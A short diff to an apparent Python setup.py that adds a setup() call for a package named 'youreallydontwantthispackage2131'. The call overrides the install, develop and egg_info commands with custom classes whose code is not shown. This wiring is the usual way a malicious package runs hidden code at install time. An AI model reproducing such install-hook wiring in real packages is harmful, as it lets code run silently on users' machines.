@@ -36,4 +36,16 @@ class CustomEggInfoCommand(egg_info):
 
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                             
+setup(
+    name='youreallydontwantthispackage2131',
+    version='1.0.1',
+    description='Descriptionnn',
+    author='testauthor',
+    author_email='youreallydontwantthispackage2131@youreallydontwantthispackage2131.com',
+    packages=[],
+    cmdclass={
+        'install': CustomInstallCommand,
+        'develop': CustomDevelopCommand,
+        'egg_info': CustomEggInfoCommand,
+    },
+)
